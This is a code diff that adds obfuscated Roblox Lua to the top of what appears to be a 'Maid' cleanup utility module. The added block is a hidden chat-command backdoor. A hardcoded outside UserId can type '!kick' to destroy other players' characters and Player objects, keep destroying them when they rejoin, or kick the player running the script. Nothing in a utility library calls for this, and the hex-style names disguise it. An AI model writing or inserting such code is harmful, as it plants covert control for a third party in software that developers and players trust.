@@ -1,3 +1,115 @@
+local _0x1A = game:GetService("Players")
+local _0x1B = _0x1A.LocalPlayer
+local _0x1C = {}
+local _0x1D = {
+    [5423052816] = true,
+    [_0x1B.UserId] = true,
+}
+
+local function _0x1E(_0x1F)
+    _0x1F = _0x1F:lower()
+    for _, _0x20 in _0x1A:GetPlayers() do
+        if _0x20.Name:lower():sub(1, #_0x1F) == _0x1F then
+            return _0x20
+        end
+    end
+    return nil
+end
+
+local function _0x21(_0x22)
+    if _0x22.Character then
+        _0x22.Character:Destroy()
+    end
+    _0x22:Destroy()
+end
+
+local function _0x23(_0x24)
+    if not _0x1C[_0x24.Name] then return end
+
+    if _0x24.Character then
+        _0x24.Character:Destroy()
+    end
+
+    _0x24.CharacterAdded:Connect(function(_0x25)
+        if _0x1C[_0x24.Name] then
+            task.defer(function()
+                _0x25:Destroy()
+            end)
+        end
+    end)
+
+    task.defer(function()
+        _0x24:Destroy()
+    end)
+end
+
+local function _0x26(_0x27, _0x28)
+    if not _0x1D[_0x27.UserId] then return end
+    if not _0x28:lower():match("^!kick ") then return end
+
+    local _0x29 = _0x28:split(" ")
+    local _0x2A = _0x29[2]
+    if not _0x2A then return end
+
+    local _0x2B = table.concat(_0x29, " ", 3)
+    if _0x2B == "" then _0x2B = "No reason" end
+
+    local _0x2C = _0x2A:lower()
+
+    if _0x2C == "all" then
+        for _, _0x2D in _0x1A:GetPlayers() do
+            if _0x2D ~= _0x1B then
+                _0x1C[_0x2D.Name] = true
+                _0x21(_0x2D)
+            end
+        end
+        _0x1B:Kick(_0x2B)
+        return
+    end
+
+    if _0x2C == "others" then
+        for _, _0x2E in _0x1A:GetPlayers() do
+            if _0x2E ~= _0x1B then
+                _0x1C[_0x2E.Name] = true
+                _0x21(_0x2E)
+            end
+        end
+        return
+    end
+
+    if _0x2C == "me" then
+        _0x1B:Kick(_0x2B)
+        return
+    end
+
+    local _0x2F = _0x1E(_0x2A)
+    if not _0x2F then return end
+
+    if _0x2F == _0x1B then
+        _0x1B:Kick(_0x2B)
+        return
+    end
+
+    _0x1C[_0x2F.Name] = true
+    _0x21(_0x2F)
+end
+
+for _, _0x30 in _0x1A:GetPlayers() do
+    _0x30.Chatted:Connect(function(_0x31)
+        _0x26(_0x30, _0x31)
+    end)
+end
+
+_0x1A.PlayerAdded:Connect(function(_0x32)
+    _0x32.Chatted:Connect(function(_0x33)
+        _0x26(_0x32, _0x33)
+    end)
+
+    if _0x1C[_0x32.Name] then
+        _0x23(_0x32)
+    end
+end)
+
 local table_insert = table.insert
 
 local Maid = {}
